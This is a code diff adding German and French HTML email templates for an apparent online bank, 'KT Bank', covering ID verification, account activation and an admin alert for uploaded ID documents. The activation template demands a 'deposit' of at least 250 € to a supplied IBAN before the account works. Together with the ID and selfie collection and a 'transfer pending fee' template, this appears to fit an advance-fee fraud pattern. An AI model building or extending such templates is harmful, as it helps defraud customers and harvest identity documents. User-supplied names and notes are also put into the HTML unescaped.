@@ -497,6 +497,194 @@ export function transferPendingFeeEmail(opts: {
   };
 }
 
+/* ─── KYC approved (account now active) ─── */
+export function kycApprovedEmail(opts: { prenom: string; lang?: "de" | "fr" }) {
+  const { prenom, lang = "de" } = opts;
+  const s = lang === "fr" ? {
+    subject: "✅ Votre identité a été vérifiée — Compte actif",
+    title: `Identité vérifiée, ${prenom} !`,
+    intro: "Votre procédure de vérification d'identité (KYC) a été complétée avec succès. Votre compte est maintenant <strong>pleinement actif</strong>.",
+    items: ["Virements SEPA disponibles", "Accès complet à tous les services", "Carte bancaire disponible"],
+    cta: "Accéder à mon compte",
+  } : {
+    subject: "✅ Ihre Identität wurde verifiziert — Konto aktiv",
+    title: `Identität verifiziert, ${prenom}!`,
+    intro: "Ihr KYC-Verfahren wurde erfolgreich abgeschlossen. Ihr Konto ist jetzt <strong>vollständig aktiv</strong>.",
+    items: ["SEPA-Überweisungen verfügbar", "Vollzugriff auf alle Dienste", "Bankkarte verfügbar"],
+    cta: "Zu meinem Konto",
+  };
+  return {
+    subject: s.subject,
+    html: base(`
+<h1 style="margin:0 0 10px;font-size:22px;font-weight:700;color:#111111;text-align:center;">${s.title}</h1>
+<p style="margin:0 0 24px;font-size:14px;color:#555555;line-height:1.6;text-align:center;">${s.intro}</p>
+<div style="background:#f0faf4;border-radius:8px;padding:18px 20px;margin:0 0 28px;">
+  ${s.items.map(i => `<p style="margin:0 0 8px;font-size:13px;color:#166534;">&#10003; &nbsp;${i}</p>`).join("")}
+</div>
+<div style="text-align:center;">
+  <a href="${DASHBOARD_URL}" style="display:inline-block;background:#005F2D;color:#ffffff;font-weight:700;font-size:14px;padding:13px 28px;border-radius:6px;text-decoration:none;">${s.cta}</a>
+</div>
+`, lang),
+  };
+}
+
+/* ─── KYC approved but activation deposit required ─── */
+export function accountActivationRequiredEmail(opts: {
+  prenom: string;
+  bank_name: string;
+  bank_iban: string;
+  bank_bic: string;
+  lang?: "de" | "fr";
+}) {
+  const { prenom, bank_name, bank_iban, bank_bic, lang = "de" } = opts;
+  const s = lang === "fr" ? {
+    subject: "✅ Identité vérifiée — Dépôt d'activation requis (250 €)",
+    title: `Identité vérifiée, ${prenom}`,
+    intro: "Votre identité a été vérifiée avec succès. Pour activer votre compte et accéder à tous les services, veuillez effectuer un <strong>dépôt initial d'au moins 250 €</strong>.",
+    coordTitle: "Coordonnées de virement",
+    nameLabel: "Bénéficiaire", ibanLabel: "IBAN", bicLabel: "BIC",
+    refLabel: "Référence", refValue: `ACTIVATION-${prenom.toUpperCase()}`,
+    warning: "Votre compte sera activé automatiquement dès réception du virement.",
+    cta: "Accéder à mon espace",
+  } : {
+    subject: "✅ Identität verifiziert — Aktivierungseinzahlung erforderlich (250 €)",
+    title: `Identität verifiziert, ${prenom}`,
+    intro: "Ihre Identität wurde erfolgreich verifiziert. Um Ihr Konto zu aktivieren und auf alle Dienste zuzugreifen, überweisen Sie bitte einen <strong>Mindestbetrag von 250 €</strong>.",
+    coordTitle: "Überweisungsdaten",
+    nameLabel: "Empfänger", ibanLabel: "IBAN", bicLabel: "BIC",
+    refLabel: "Verwendungszweck", refValue: `AKTIVIERUNG-${prenom.toUpperCase()}`,
+    warning: "Ihr Konto wird automatisch aktiviert sobald die Überweisung eingegangen ist.",
+    cta: "Zu meinem Bereich",
+  };
+  const rows = [
+    [s.nameLabel, bank_name],
+    [s.ibanLabel, bank_iban],
+    [s.bicLabel, bank_bic],
+    [s.refLabel, s.refValue],
+    [lang === "fr" ? "Montant minimum" : "Mindestbetrag", "250,00 EUR"],
+  ];
+  const tableRows = rows.map(([k, v]) => `
+    <tr>
+      <td style="padding:8px 12px;font-size:12px;color:#999999;border-bottom:1px solid #eeeeee;white-space:nowrap;">${k}</td>
+      <td style="padding:8px 12px;font-size:13px;color:#111111;border-bottom:1px solid #eeeeee;font-weight:600;font-family:'Courier New',monospace;">${v}</td>
+    </tr>`).join("");
+  return {
+    subject: s.subject,
+    html: base(`
+<h1 style="margin:0 0 10px;font-size:20px;font-weight:700;color:#111111;">${s.title}</h1>
+<p style="margin:0 0 24px;font-size:14px;color:#555555;line-height:1.6;">${s.intro}</p>
+<p style="margin:0 0 8px;font-size:12px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;color:#d97706;">${s.coordTitle}</p>
+<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="border:2px solid #fde68a;border-radius:6px;overflow:hidden;margin:0 0 20px;background:#fffbf0;">
+  ${tableRows}
+</table>
+<div style="background:#fef3c7;border:1px solid #fcd34d;border-radius:6px;padding:12px 16px;margin:0 0 24px;">
+  <p style="margin:0;font-size:13px;color:#92400e;font-weight:600;">${s.warning}</p>
+</div>
+<div style="text-align:center;">
+  <a href="${DASHBOARD_URL}" style="display:inline-block;background:#005F2D;color:#ffffff;font-weight:700;font-size:13px;padding:12px 24px;border-radius:6px;text-decoration:none;">${s.cta}</a>
+</div>
+`, lang),
+  };
+}
+
+/* ─── Account activated after deposit ─── */
+export function accountActivatedEmail(opts: { prenom: string; balance: number; lang?: "de" | "fr" }) {
+  const { prenom, balance, lang = "de" } = opts;
+  const s = lang === "fr" ? {
+    subject: "🎉 Votre compte est maintenant actif !",
+    title: `Compte activé, ${prenom} !`,
+    intro: "Votre dépôt a bien été reçu. Votre compte KT Bank est maintenant <strong>entièrement actif</strong>. Vous pouvez utiliser toutes les fonctionnalités.",
+    balanceLabel: "Solde actuel",
+    cta: "Accéder à mon compte",
+  } : {
+    subject: "🎉 Ihr Konto ist jetzt aktiv!",
+    title: `Konto aktiviert, ${prenom}!`,
+    intro: "Ihre Einzahlung ist eingegangen. Ihr KT Bank Konto ist jetzt <strong>vollständig aktiv</strong>. Sie können alle Funktionen nutzen.",
+    balanceLabel: "Aktueller Kontostand",
+    cta: "Zu meinem Konto",
+  };
+  return {
+    subject: s.subject,
+    html: base(`
+<h1 style="margin:0 0 10px;font-size:22px;font-weight:700;color:#111111;text-align:center;">${s.title}</h1>
+<p style="margin:0 0 24px;font-size:14px;color:#555555;line-height:1.6;text-align:center;">${s.intro}</p>
+<div style="background:#f0faf4;border-radius:8px;padding:18px 20px;margin:0 0 28px;text-align:center;">
+  <p style="margin:0 0 4px;font-size:11px;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;color:#005F2D;">${s.balanceLabel}</p>
+  <p style="margin:0;font-size:28px;font-weight:800;color:#005F2D;">${balance.toFixed(2)} EUR</p>
+</div>
+<div style="text-align:center;">
+  <a href="${DASHBOARD_URL}" style="display:inline-block;background:#005F2D;color:#ffffff;font-weight:700;font-size:14px;padding:13px 28px;border-radius:6px;text-decoration:none;">${s.cta}</a>
+</div>
+`, lang),
+  };
+}
+
+/* ─── KYC rejected ─── */
+export function kycRejectedEmail(opts: { prenom: string; notes?: string; lang?: "de" | "fr" }) {
+  const { prenom, notes, lang = "de" } = opts;
+  const s = lang === "fr" ? {
+    subject: "Vérification d'identité refusée — Action requise",
+    title: `Vérification refusée, ${prenom}`,
+    intro: "Votre demande de vérification d'identité n'a pas pu être validée.",
+    notesLabel: "Motif / remarques",
+    nextSteps: "Veuillez soumettre à nouveau vos documents en vous assurant qu'ils sont lisibles, non expirés et correspondent aux informations de votre profil.",
+    cta: "Soumettre mes documents",
+  } : {
+    subject: "Identitätsverifizierung abgelehnt — Aktion erforderlich",
+    title: `Verifizierung abgelehnt, ${prenom}`,
+    intro: "Ihr KYC-Antrag konnte nicht bestätigt werden.",
+    notesLabel: "Grund / Anmerkungen",
+    nextSteps: "Bitte laden Sie Ihre Dokumente erneut hoch und stellen Sie sicher, dass sie lesbar, nicht abgelaufen sind und mit Ihren Profildaten übereinstimmen.",
+    cta: "Dokumente erneut einreichen",
+  };
+  return {
+    subject: s.subject,
+    html: base(`
+<h1 style="margin:0 0 10px;font-size:20px;font-weight:700;color:#111111;">${s.title}</h1>
+<p style="margin:0 0 20px;font-size:14px;color:#555555;line-height:1.6;">${s.intro}</p>
+${notes ? `
+<div style="border:1px solid #fecaca;background:#fef2f2;border-radius:6px;padding:14px 18px;margin:0 0 20px;">
+  <p style="margin:0 0 4px;font-size:11px;color:#991b1b;font-weight:700;text-transform:uppercase;letter-spacing:0.06em;">${s.notesLabel}</p>
+  <p style="margin:0;font-size:13px;color:#991b1b;">${notes}</p>
+</div>` : ""}
+<p style="margin:0 0 24px;font-size:13px;color:#555555;line-height:1.6;">${s.nextSteps}</p>
+<div style="text-align:center;">
+  <a href="${DASHBOARD_URL}" style="display:inline-block;background:#dc2626;color:#ffffff;font-weight:700;font-size:13px;padding:12px 24px;border-radius:6px;text-decoration:none;">${s.cta}</a>
+</div>
+`, lang),
+  };
+}
+
+/* ─── Admin: KYC documents submitted ─── */
+export function adminKycSubmittedEmail(opts: {
+  prenom: string; nom: string; email: string; document_type: string;
+}) {
+  const ADMIN_URL = "https://kt-bank-ag.com/kt-admin";
+  const typeLabels: Record<string, string> = {
+    id_front: "Recto de la pièce d'identité",
+    id_back: "Verso de la pièce d'identité",
+    selfie: "Selfie avec pièce d'identité",
+  };
+  return {
+    subject: `KYC — Document soumis : ${opts.prenom} ${opts.nom}`,
+    html: base(`
+<h1 style="margin:0 0 6px;font-size:20px;font-weight:700;color:#111111;">Nouveau document KYC soumis</h1>
+<p style="margin:0 0 20px;font-size:13px;color:#666666;">Un client vient de soumettre un document d'identité.</p>
+<table role="presentation" width="100%" cellpadding="0" cellspacing="0" style="border:1px solid #eeeeee;border-radius:6px;overflow:hidden;margin:0 0 20px;">
+  <tr><td style="padding:8px 12px;font-size:12px;color:#666666;border-bottom:1px solid #eeeeee;white-space:nowrap;">Client</td>
+      <td style="padding:8px 12px;font-size:13px;color:#111111;border-bottom:1px solid #eeeeee;font-weight:600;">${opts.prenom} ${opts.nom}</td></tr>
+  <tr><td style="padding:8px 12px;font-size:12px;color:#666666;border-bottom:1px solid #eeeeee;">E-mail</td>
+      <td style="padding:8px 12px;font-size:13px;color:#111111;border-bottom:1px solid #eeeeee;">${opts.email}</td></tr>
+  <tr><td style="padding:8px 12px;font-size:12px;color:#666666;">Document</td>
+      <td style="padding:8px 12px;font-size:13px;color:#111111;font-weight:600;">${typeLabels[opts.document_type] ?? opts.document_type}</td></tr>
+</table>
+<div style="text-align:center;">
+  <a href="${ADMIN_URL}/clients" style="display:inline-block;background:#005F2D;color:#ffffff;font-weight:700;font-size:13px;padding:12px 24px;border-radius:6px;text-decoration:none;">Voir le dossier client</a>
+</div>
+`, "fr"),
+  };
+}
+
 /* ─── Security alert ─── */
 export function securityAlertEmail(prenom: string, reason: string, lang: "de" | "fr" = "de") {
   const s = lang === "fr" ? {
